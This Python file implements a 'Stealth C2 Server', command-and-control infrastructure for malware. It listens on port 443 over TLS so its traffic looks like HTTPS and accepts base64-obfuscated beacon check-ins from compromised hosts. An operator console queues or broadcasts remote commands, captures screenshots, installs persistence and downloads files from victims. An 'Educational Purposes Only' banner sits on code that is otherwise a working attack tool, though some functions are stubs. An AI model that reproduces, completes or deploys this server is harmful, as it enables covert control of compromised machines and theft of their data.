import socket
import threading
import time
import json
import sys
import os
from datetime import datetime
import select
import ssl
import base64
import hashlib
import random

class StealthC2Server:
    def __init__(self, host='0.0.0.0', port=443):  # Use HTTPS port
        self.host = host
        self.port = port
        self.clients = {}  # {client_id: {'socket': socket, 'last_seen': timestamp, 'online': bool, 'info': dict}}
        self.client_lock = threading.Lock()
        self.running = True
        self.command_queue = {}  # {client_id: [commands]}
        
        # SSL Context for HTTPS-like traffic
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
        
        # Generate with: openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes
        
    def start(self):
        """Start the C2 server with SSL"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.host, self.port))
            sock.listen(100)
            
            # Wrap with SSL
            ssl_sock = self.context.wrap_socket(sock, server_side=True)
            
            print(f"[+] Stealth C2 Server started on {self.host}:{self.port} (HTTPS)")
            print("[+] Waiting for beacon connections...")
            
            # Start console and monitor threads
            threading.Thread(target=self.console, daemon=True).start()
            threading.Thread(target=self.monitor_clients, daemon=True).start()
            threading.Thread(target=self.cleanup_dead_clients, daemon=True).start()
            
            while self.running:
                try:
                    readable, _, _ = select.select([ssl_sock], [], [], 1)
                    if readable:
                        client_socket, client_address = ssl_sock.accept()
                        
                        # Handle in separate thread
                        client_thread = threading.Thread(
                            target=self.handle_client,
                            args=(client_socket, client_address)
                        )
                        client_thread.daemon = True
                        client_thread.start()
                except Exception as e:
                    if self.running:
                        print(f"[-] Accept error: {e}")
                    
        except Exception as e:
            print(f"[-] Server error: {e}")
        finally:
            self.stop()
    
    def handle_client(self, client_socket, client_address):
        """Handle client beacon connections"""
        client_id = None
        try:
            # Initial beacon handshake
            data = client_socket.recv(4096)
            if not data:
                return
            
            # Decode beacon data (encrypted/obfuscated)
            try:
                beacon_data = json.loads(base64.b64decode(data).decode())
                client_id = beacon_data.get('id', hashlib.md5(str(client_address).encode()).hexdigest()[:8])
                system_info = beacon_data.get('info', {})
                
                with self.client_lock:
                    self.clients[client_id] = {
                        'socket': client_socket,
                        'address': client_address,
                        'last_seen': time.time(),
                        'online': True,
                        'info': system_info,
                        'first_seen': time.time()
                    }
                
                print(f"[+] Beacon check-in: {client_id} | {system_info.get('hostname', 'Unknown')}")
                print(f"    IP: {client_address[0]} | OS: {system_info.get('os', 'Unknown')}")
                
                # Send pending commands if any
                if client_id in self.command_queue and self.command_queue[client_id]:
                    command = self.command_queue[client_id].pop(0)
                    client_socket.send(base64.b64encode(command.encode()))
                else:
                    client_socket.send(base64.b64encode("idle".encode()))
                
                # Keep connection open for a bit to receive output
                time.sleep(0.5)
                
                # Check for command output
                try:
                    output_data = client_socket.recv(16384)
                    if output_data:
                        output = base64.b64decode(output_data).decode('utf-8', errors='ignore')
                        print(f"\n[+] Output from {client_id}:\n{output}\n")
                except:
                    pass
                    
            except:
                # Legacy or malformed connection
                client_socket.close()
                
        except Exception as e:
            print(f"[-] Client handler error: {e}")
        finally:
            if client_id:
                with self.client_lock:
                    if client_id in self.clients:
                        self.clients[client_id]['online'] = False
    
    def monitor_clients(self):
        """Monitor client status and display changes"""
        last_status = {}
        while self.running:
            time.sleep(5)
            with self.client_lock:
                current_time = time.time()
                for client_id, client_data in self.clients.items():
                    was_online = last_status.get(client_id, False)
                    is_online = client_data['online']
                    
                    if not was_online and is_online:
                        print(f"[+] CLIENT ONLINE: {client_id} - {client_data['info'].get('hostname', 'Unknown')}")
                    elif was_online and not is_online:
                        print(f"[-] CLIENT OFFLINE: {client_id} - {client_data['info'].get('hostname', 'Unknown')}")
                    
                    last_status[client_id] = is_online
                
                # Print status summary every 30 seconds
                if int(time.time()) % 30 == 0:
                    online_count = sum(1 for c in self.clients.values() if c['online'])
                    print(f"\n[STATUS] Online: {online_count} | Total: {len(self.clients)} | Time: {datetime.now().strftime('%H:%M:%S')}\n")
    
    def cleanup_dead_clients(self):
        """Remove clients offline for too long"""
        while self.running:
            time.sleep(60)
            with self.client_lock:
                current_time = time.time()
                to_remove = []
                for client_id, client_data in list(self.clients.items()):
                    if not client_data['online'] and (current_time - client_data['last_seen']) > 300:  # 5 minutes
                        to_remove.append(client_id)
                
                for client_id in to_remove:
                    del self.clients[client_id]
                    print(f"[!] Removed stale client: {client_id}")
    
    def console(self):
        """Interactive command console"""
        while self.running:
            try:
                cmd = input("\nC2> ").strip()
                
                if not cmd:
                    continue
                
                if cmd.lower() == 'exit':
                    self.running = False
                    print("[+] Shutting down...")
                    os._exit(0)
                
                elif cmd.lower() == 'help':
                    self.show_help()
                
                elif cmd.lower() == 'list':
                    self.list_clients()
                
                elif cmd.lower().startswith('use '):
                    self.select_client(cmd[4:].strip())
                
                elif cmd.lower().startswith('cmd '):
                    self.send_command(cmd[4:].strip())
                
                elif cmd.lower().startswith('broadcast '):
                    self.broadcast_command(cmd[10:].strip())
                
                elif cmd.lower() == 'status':
                    self.show_status()
                
                elif cmd.lower().startswith('screenshot'):
                    self.queue_command('screenshot')
                
                elif cmd.lower().startswith('persist'):
                    self.queue_command('persist')
                
                elif cmd.lower().startswith('download '):
                    self.queue_command(cmd)
                
                else:
                    print(f"Unknown command: {cmd}")
                    
            except KeyboardInterrupt:
                print("\n[!] Interrupted. Type 'exit' to quit.")
            except Exception as e:
                print(f"Console error: {e}")
    
    def show_help(self):
        help_text = """
        C2 Commands:
        ------------
        help                - Show this help
        list                - List all connected clients
        use <client_id>     - Select a client for interaction
        cmd <command>       - Execute command on selected client
        broadcast <cmd>     - Send command to all online clients
        status              - Show server status
        screenshot          - Capture screenshot from client
        persist             - Install persistence on client
        download <file>     - Download file from client
        exit               - Shutdown server
        """
        print(help_text)
    
    def list_clients(self):
        with self.client_lock:
            if not self.clients:
                print("No clients connected")
                return
            
            print(f"\n{'ID':<10} {'Status':<10} {'Hostname':<20} {'IP':<15} {'Last Seen':<20}")
            print("-" * 80)
            for client_id, data in self.clients.items():
                status = "ONLINE" if data['online'] else "OFFLINE"
                last_seen = datetime.fromtimestamp(data['last_seen']).strftime('%Y-%m-%d %H:%M:%S')
                hostname = data['info'].get('hostname', 'Unknown')[:18]
                ip = data['address'][0] if 'address' in data else 'N/A'
                
                print(f"{client_id:<10} {status:<10} {hostname:<20} {ip:<15} {last_seen:<20}")
    
    def select_client(self, client_id):
        with self.client_lock:
            if client_id in self.clients:
                print(f"[+] Selected client: {client_id}")
                # In a full implementation, you'd set a global selected_client
            else:
                print(f"[-] Client not found: {client_id}")
    
    def send_command(self, command):
        # Simplified - in real implementation, you'd send to selected client
        print(f"[+] Command queued: {command}")
        # self.command_queue[client_id].append(command)
    
    def broadcast_command(self, command):
        with self.client_lock:
            for client_id in self.clients:
                if client_id not in self.command_queue:
                    self.command_queue[client_id] = []
                self.command_queue[client_id].append(command)
            print(f"[+] Broadcast command to {len(self.clients)} clients: {command}")
    
    def queue_command(self, command):
        print(f"[+] Special command queued: {command}")
    
    def show_status(self):
        with self.client_lock:
            online = sum(1 for c in self.clients.values() if c['online'])
            total = len(self.clients)
            print(f"\n[Server Status]")
            print(f"Online clients: {online}/{total}")
            print(f"Uptime: {time.time() - self.start_time if hasattr(self, 'start_time') else 0:.0f}s")
            print(f"Port: {self.port}")
            print(f"Command queue size: {sum(len(q) for q in self.command_queue.values())}")
    
    def stop(self):
        self.running = False
        print("[+] Server stopped")

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════╗
    ║       STEALTH C2 SERVER              ║
    ║      Educational Purposes Only       ║
    ╚══════════════════════════════════════╝
    """)
    
    # Generate SSL cert if not exists
    if not os.path.exists('cert.pem'):
        print("[!] SSL certificate not found. Generate with:")
        print("    openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes")
        print("[!] Or disable SSL in code for testing")
        sys.exit(1)
    
    server = StealthC2Server(port=443)
    server.start_time = time.time()
    server.start()
